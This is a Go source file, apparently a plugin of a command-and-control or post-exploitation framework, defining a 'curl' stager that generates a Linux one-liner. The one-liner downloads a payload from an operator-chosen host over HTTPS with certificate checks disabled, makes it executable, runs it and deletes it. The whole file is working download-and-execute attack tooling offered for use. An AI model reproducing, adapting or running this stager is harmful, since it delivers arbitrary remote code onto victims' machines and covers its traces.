package loader

import "fmt"

type curlLoader struct{}

func init() { Register(&curlLoader{}) }

func (c *curlLoader) Name() string        { return "curl" }
func (c *curlLoader) Description() string { return "curl HTTPS pull + exec" }
func (c *curlLoader) RequiresTool() string { return "curl" }

func (c *curlLoader) Supports(os, arch string) bool {
	return os == "linux" || os == "unknown"
}

func (c *curlLoader) Generate(opts StagerOpts) (string, error) {
	if err := ValidateOpts(opts); err != nil {
		return "", err
	}
	return fmt.Sprintf(
		`f=$(mktemp);curl -sk https://%s:%s/p/%s -o $f;chmod +x $f;$f;rm -f $f`,
		opts.Host, opts.Port, opts.Token,
	), nil
}
